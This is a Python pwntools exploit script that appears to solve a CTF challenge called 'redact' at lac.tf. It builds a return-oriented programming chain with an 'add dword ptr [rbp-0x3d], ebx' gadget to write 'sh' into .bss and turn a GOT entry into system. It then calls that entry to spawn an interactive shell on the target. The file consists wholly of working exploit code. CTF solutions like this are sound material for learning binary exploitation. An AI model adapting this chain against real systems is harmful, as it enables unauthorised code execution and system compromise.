#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("redact_patched")
libc = ELF("./libc-2.31.so")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "lac.tf", "31281"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

gadget_add = 0x00000000004011e8 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
gadget_pops = 0x0000000000401610 # pop rbx ; pop r12 ; pop rbp ; ret
pop_rdi = 0x000000000040177b # pop rdi ; ret

def add_gadget(address, val):
  global gadget_add
  global gadget_pops
  return p64(gadget_pops)+p64(val & 0xffffffff)+p64(0)+p64(address+0x3d)+p64(gadget_add)

bss = 0x404c00
# overwrite _ZNSt8ios_base4InitC1Ev  got entry, and change it to system with_add gadget,  write 'sh' string in .bss with add_gadget, then jump to _ZNSt8ios_base4InitC1Ev@plt
payload = add_gadget(bss, u32(b'sh\x00\x00') )+add_gadget(0x404078, 0xffffffffffda1be0 ) + p64(pop_rdi)+p64(bss)+p64(0x4010f0) 
sla('text: ', 'aa')
sla('placeholder: ', payload)
sla('redact: ', '72')


p.interactive()

